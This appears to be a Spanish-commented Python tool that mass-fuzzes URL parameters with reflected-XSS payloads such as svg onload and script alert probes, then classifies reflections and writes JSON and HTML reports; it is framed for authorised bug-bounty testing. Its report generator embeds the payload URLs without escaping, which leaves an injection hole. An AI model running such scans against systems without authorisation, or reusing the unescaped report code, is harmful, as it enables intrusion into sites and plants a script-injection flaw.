#!/usr/bin/env python3
"""
html_inject_fuzzer.py

Herramienta todo-en-uno para descubrir HTML/XSS reflejado:
  1) Toma una lista de URLs base (dominios/rutas SIN parámetros)
  2) Genera combinaciones URL x parámetro x payload
  3) Dispara las requests de forma asíncrona (rápido, con control de rate)
  4) Analiza cada respuesta: ¿se reflejó el payload sin escapar? ¿en qué contexto HTML?
  5) Exporta hallazgos en JSON + reporte HTML, listos para revisar/reportar

No depende de Nuclei — es un motor de fuzzing + detección propio.

USO BÁSICO
----------
    python3 html_inject_fuzzer.py -l targets.txt

    targets.txt debe tener una URL BASE por línea, por ejemplo:
        https://ejemplo.com/search
        https://ejemplo.com/products

USO AVANZADO
------------
    python3 html_inject_fuzzer.py \
        -l targets.txt \
        --params params_extra.txt \
        --payloads payloads_extra.txt \
        -c 20 --rate 30 \
        -o hallazgos.json --html-report reporte.html

⚠️  Usar SOLO contra activos con autorización explícita (bug bounty en scope,
    contrato de pentesting, o infraestructura propia).
"""

import argparse
import asyncio
import json
import random
import re
import string
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional

try:
    import aiohttp
except ImportError:
    print("[!] Falta aiohttp. Instala con: pip install aiohttp")
    sys.exit(1)


# ==================================================================== #
#  Listas por defecto (se pueden ampliar con --params / --payloads)
# ==================================================================== #

DEFAULT_PARAMS = [
    "q", "s", "f", "t", "qs", "id", "y", "n", "th",
    "search", "query", "keyword", "keywords", "term", "terms", "k", "kw",
    "page", "p", "pg", "pageid", "page_id", "view", "action", "act",
    "url", "u", "link", "href", "target", "dest", "destination",
    "redirect", "redirect_uri", "redirect_url", "redirectUrl", "return",
    "returnUrl", "return_url", "returnTo", "return_to",
    "next", "continue", "goto", "forward", "nextpage", "checkout_url",
    "name", "username", "user", "uid", "login", "account",
    "email", "mail", "e_mail",
    "text", "txt", "msg", "message", "comment", "comments", "content",
    "body", "data",
    "title", "subject", "description", "desc", "summary", "note", "notes",
    "callback", "jsonp", "cb",
    "ref", "referrer", "referer", "source", "src", "from", "origin",
    "lang", "language", "locale",
    "file", "filename", "path", "dir",
    "type", "format", "mode", "style", "theme", "template",
    "sort", "order", "orderby", "filter",
    "category", "cat", "tag",
    "input", "value", "val", "param", "field",
    "image", "img",
    "error", "err", "errormsg", "error_message", "warning",
    "debug", "test",
    "session", "token", "state",
    "width", "height", "color",
    "city", "address", "phone",
    "show", "step", "tab",
    "first_name", "last_name", "fullname",
    "event", "feedback", "review",
    "domain", "host", "version", "config", "setting",
]

# Cada payload debe contener el literal {MARKER}, que el script reemplaza
# por un token único por ejecución para evitar falsos positivos por
# contenido preexistente en la página / caché.
DEFAULT_PAYLOADS = [
    '"><u>{MARKER}</u>',
    "'><u>{MARKER}</u>",
    "<u>{MARKER}</u>",
    '"><svg onload=alert({MARKER})>',
    '" autofocus onfocus=alert({MARKER}) x="',
    "'-alert({MARKER})-'",
    "</script><script>alert({MARKER})</script>",
]


# ==================================================================== #
#  Estructuras de datos
# ==================================================================== #

@dataclass
class Finding:
    url: str
    param: str
    payload: str
    marker: str
    status: str                 # reflected_unescaped | reflected_escaped | reflected_sanitized | not_reflected | error
    context: Optional[str] = None
    http_status: Optional[int] = None
    content_type: Optional[str] = None
    csp_present: bool = False
    elapsed_ms: Optional[int] = None
    notes: list = field(default_factory=list)


# ==================================================================== #
#  Utilidades
# ==================================================================== #

def gen_marker() -> str:
    """Token corto y único, alfanumérico (para no romper URLs ni JSON)."""
    return "m" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def load_lines(path: str) -> list:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]


def build_url(base_url: str, param: str, value: str) -> str:
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def html_escape(s: str) -> str:
    """Escapado estándar equivalente al que haría un framework 'seguro'."""
    return (
        s.replace("&", "&amp;")
         .replace("<", "&lt;")
         .replace(">", "&gt;")
         .replace('"', "&quot;")
         .replace("'", "&#x27;")
    )


def classify_context(html: str, marker: str) -> str:
    idx = html.find(marker)
    if idx == -1:
        return "unknown"

    tag_start = html.rfind("<", 0, idx)

    last_script_open = html.rfind("<script", 0, idx)
    last_script_close = html.rfind("</script", 0, idx)
    if last_script_open > last_script_close:
        return "script_block"

    last_comment_open = html.rfind("<!--", 0, idx)
    last_comment_close = html.rfind("-->", 0, idx)
    if last_comment_open > last_comment_close:
        return "html_comment"

    tag_text_before_marker = html[tag_start:idx] if tag_start != -1 else ""
    if re.search(r'=\s*"[^"]*$', tag_text_before_marker) or re.search(r"=\s*'[^']*$", tag_text_before_marker):
        return "html_attribute"

    window = html[max(0, idx - 40): idx]
    if "<u>" in window.lower() or "<svg" in window.lower() or "<script" in window.lower():
        return "html_tag_injected"

    return "html_text"


# ==================================================================== #
#  Motor de fuzzing
# ==================================================================== #

async def probe(session: aiohttp.ClientSession, base_url: str, param: str,
                 payload_template: str, timeout: int, sem: asyncio.Semaphore,
                 min_delay: float) -> Finding:
    marker = gen_marker()
    payload = payload_template.replace("{MARKER}", marker)
    target_url = build_url(base_url, param, payload)

    finding = Finding(url=target_url, param=param, payload=payload, marker=marker, status="error")

    async with sem:
        start = time.time()
        try:
            headers = {"User-Agent": "Mozilla/5.0 (html-inject-fuzzer)"}
            async with session.get(target_url, timeout=timeout, headers=headers, ssl=False) as resp:
                finding.http_status = resp.status
                finding.content_type = resp.headers.get("Content-Type")
                finding.csp_present = "content-security-policy" in {k.lower() for k in resp.headers.keys()}

                body = await resp.text(errors="ignore")

                if payload in body:
                    # El payload EXACTO (comillas/ángulos incluidos) sobrevivió intacto.
                    ctx = classify_context(body, marker)
                    finding.context = ctx
                    finding.status = "reflected_unescaped"
                    if ctx == "html_attribute":
                        finding.notes.append("Reflejo dentro de un atributo HTML — probable inyección rompiendo comillas.")
                    elif ctx == "script_block":
                        finding.notes.append("Reflejo dentro de <script> — revisar si rompe el contexto JS.")
                    elif ctx == "html_tag_injected":
                        finding.notes.append("El payload quedó como tag/atributo HTML nuevo, sin escapar — alta confianza de XSS.")
                    elif ctx == "html_comment":
                        finding.notes.append("Reflejo dentro de un comentario HTML — generalmente no explotable directamente.")
                elif html_escape(payload) in body:
                    # Se refleja pero el framework escapó < > " ' & correctamente.
                    finding.status = "reflected_escaped"
                    finding.notes.append("El servidor HTML-escapó el payload completo (&lt; &gt; &quot; etc.) — no explotable así.")
                elif marker in body:
                    # El marcador sobrevivió pero ni el payload crudo ni el escapado
                    # calzan exacto: probablemente hubo sanitización parcial
                    # (stripping de tags/atributos peligrosos) — merece revisión manual.
                    finding.status = "reflected_sanitized"
                    finding.notes.append(
                        "El marcador aparece en el body pero el payload fue alterado "
                        "(no es ni el crudo ni el escapado estándar) — posible sanitización "
                        "parcial, revisar manualmente con otro payload."
                    )
                else:
                    finding.status = "not_reflected"

        except asyncio.TimeoutError:
            finding.notes.append("Timeout.")
        except Exception as e:
            finding.notes.append(f"Excepción: {e!r}")
        finally:
            finding.elapsed_ms = int((time.time() - start) * 1000)
            if min_delay:
                await asyncio.sleep(min_delay)

    return finding


async def run_fuzz(targets: list, params: list, payloads: list,
                    concurrency: int, timeout: int, rate_per_sec: float) -> list:
    sem = asyncio.Semaphore(concurrency)
    min_delay = (1.0 / rate_per_sec) if rate_per_sec > 0 else 0.0

    connector = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for base_url in targets:
            for param in params:
                for payload_template in payloads:
                    tasks.append(
                        probe(session, base_url, param, payload_template, timeout, sem, min_delay)
                    )

        total = len(tasks)
        print(f"[*] Lanzando {total} requests ({len(targets)} targets x {len(params)} params x {len(payloads)} payloads)")
        print(f"[*] Concurrencia: {concurrency} | Rate objetivo: {rate_per_sec or 'sin límite'} req/s\n")

        results = []
        done = 0
        for coro in asyncio.as_completed(tasks):
            r = await coro
            done += 1
            if r.status in ("reflected_unescaped", "reflected_sanitized"):
                mark = "[VULN] " if r.status == "reflected_unescaped" else "[REV]  "
                print(f"{mark}{r.status:20s} param={r.param:15s} ctx={r.context or '-':18s} {r.url}")
            if done % 200 == 0 or done == total:
                print(f"    ... progreso: {done}/{total}")
            results.append(r)

        return results


# ==================================================================== #
#  Reporte
# ==================================================================== #

def write_html_report(results: list, out_path: str):
    order = ["reflected_unescaped", "reflected_sanitized", "reflected_escaped", "not_reflected", "error"]
    color = {
        "reflected_unescaped": "#c0392b",
        "reflected_sanitized": "#e67e22",
        "reflected_escaped": "#f39c12",
        "not_reflected": "#7f8c8d",
        "error": "#95a5a6",
    }
    label = {
        "reflected_unescaped": "REFLEJADO SIN ESCAPAR (posible XSS)",
        "reflected_sanitized": "REFLEJADO CON SANITIZACIÓN PARCIAL (revisar)",
        "reflected_escaped": "REFLEJADO PERO ESCAPADO (no explotable)",
        "not_reflected": "NO REFLEJADO",
        "error": "ERROR",
    }

    blocks = []
    for status in order:
        group = [r for r in results if r.status == status]
        if not group:
            continue
        blocks.append(f'<h2 style="color:{color[status]}">{label[status]} ({len(group)})</h2>')
        if status in ("reflected_unescaped", "reflected_sanitized"):
            blocks.append('<table border="1" cellpadding="6" cellspacing="0" style="border-collapse:collapse;width:100%">')
            blocks.append("<tr><th>Param</th><th>Contexto</th><th>CSP</th><th>URL</th><th>Notas</th></tr>")
            for r in group:
                blocks.append(
                    f"<tr>"
                    f"<td>{r.param}</td>"
                    f"<td>{r.context or '-'}</td>"
                    f"<td>{'Sí' if r.csp_present else 'No'}</td>"
                    f"<td style='max-width:420px;word-break:break-all'><a href='{r.url}' target='_blank'>{r.url}</a></td>"
                    f"<td>{'<br>'.join(r.notes)}</td>"
                    f"</tr>"
                )
            blocks.append("</table>")
        else:
            blocks.append(f"<p>{len(group)} resultados omitidos del detalle (no relevantes para explotación directa).</p>")

    html = f"""<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<title>Reporte de fuzzing HTML Injection</title>
<style>
body {{ font-family: -apple-system, Arial, sans-serif; margin: 30px; background:#fafafa; }}
table {{ background:#fff; margin-bottom: 30px; font-size: 13px; }}
th {{ background:#2c3e50; color:#fff; text-align:left; }}
a {{ color:#2980b9; }}
</style></head><body>
<h1>Reporte de fuzzing HTML Injection / XSS reflejado</h1>
<p>Total de requests: {len(results)}</p>
{"".join(blocks)}
</body></html>"""

    Path(out_path).write_text(html, encoding="utf-8")


# ==================================================================== #
#  Main
# ==================================================================== #

def main():
    parser = argparse.ArgumentParser(
        description="Fuzzer de parámetros + inyección de payloads + verificación de reflejo HTML (sin depender de Nuclei)."
    )
    parser.add_argument("-l", "--list", required=True,
                         help="Archivo con URLs base, una por línea (sin parámetros o con ellos, se añade uno nuevo)")
    parser.add_argument("--params", help="Archivo .txt con parámetros extra, uno por línea (se suman a los ~140 por defecto)")
    parser.add_argument("--payloads", help="Archivo .txt con payloads extra, uno por línea. Debe incluir el literal {MARKER}")
    parser.add_argument("-c", "--concurrency", type=int, default=15, help="Requests concurrentes (default: 15)")
    parser.add_argument("--rate", type=float, default=0, help="Límite aproximado de requests/segundo por worker (0 = sin límite)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout por request en segundos (default: 10)")
    parser.add_argument("-o", "--output", default="hallazgos.json", help="Archivo JSON de salida")
    parser.add_argument("--html-report", default="reporte_fuzz.html", help="Archivo HTML de salida")
    parser.add_argument("--only-vuln", action="store_true", help="Guardar en el JSON solo reflected_unescaped y reflected_sanitized")
    args = parser.parse_args()

    targets = load_lines(args.list)
    if not targets:
        print("[!] El archivo de targets está vacío.")
        sys.exit(1)

    params = list(DEFAULT_PARAMS)
    if args.params:
        params = sorted(set(params) | set(load_lines(args.params)))

    payloads = list(DEFAULT_PAYLOADS)
    if args.payloads:
        extra = load_lines(args.payloads)
        for p in extra:
            if "{MARKER}" not in p:
                print(f"[!] Ignorando payload sin {{MARKER}}: {p}")
                continue
            payloads.append(p)

    print(f"[*] Targets: {len(targets)} | Parámetros: {len(params)} | Payloads: {len(payloads)}")
    total_requests = len(targets) * len(params) * len(payloads)
    print(f"[*] Total de requests estimadas: {total_requests}")
    if total_requests > 5000:
        print("[!] Aviso: eso es bastante tráfico. Considera bajar params/payloads o subir --rate con cuidado.\n")

    results = asyncio.run(
        run_fuzz(targets, params, payloads, args.concurrency, args.timeout, args.rate)
    )

    to_dump = [asdict(r) for r in results if (not args.only_vuln or r.status in ("reflected_unescaped", "reflected_sanitized"))]
    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(to_dump, f, indent=2, ensure_ascii=False)

    write_html_report(results, args.html_report)

    counts = {}
    for r in results:
        counts[r.status] = counts.get(r.status, 0) + 1

    print("\n===== RESUMEN =====")
    for k in ["reflected_unescaped", "reflected_sanitized", "reflected_escaped", "not_reflected", "error"]:
        if k in counts:
            print(f"  {k}: {counts[k]}")

    vuln_count = counts.get("reflected_unescaped", 0) + counts.get("reflected_sanitized", 0)
    print(f"\n[+] Hallazgos potencialmente explotables: {vuln_count}")
    print(f"[+] JSON:  {args.output}")
    print(f"[+] HTML:  {args.html_report}")

    if vuln_count:
        print("\n[i] Siguiente paso recomendado: pasar los 'reflected_unescaped' por")
        print("    xss_verify.py (verificador con navegador) para confirmar ejecución real de JS.")


if __name__ == "__main__":
    main()
